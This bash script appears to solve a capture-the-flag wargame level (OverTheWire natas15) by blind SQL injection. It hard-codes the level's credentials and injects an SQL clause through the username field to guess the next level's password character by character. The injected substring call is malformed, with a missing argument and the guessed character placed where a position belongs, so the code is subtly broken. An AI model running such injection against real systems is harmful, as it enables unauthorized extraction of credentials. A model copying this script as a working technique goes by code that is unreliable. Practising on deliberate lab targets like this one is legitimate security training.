#!/bin/bash

exist_password=""

for position in {1..32}
do
    for symbol in {a..z} {A..Z} {0..9}
    do
        if curl -u "natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx" \
        -d "username=natas16\" AND BINARY substring(password,$symbol,) = \"${exist_password}${symbol}\" -- " \
        http://natas15.natas.labs.overthewire.org/index.php 2>/dev/null | grep -q "This user exists."; then
            
            exist_password="${exist_password}${symbol}"
            echo "Found: $symbol at position $position"
            echo "Current password: $exist_password"
            break
        fi
    done
done

echo "Final password: $exist_password"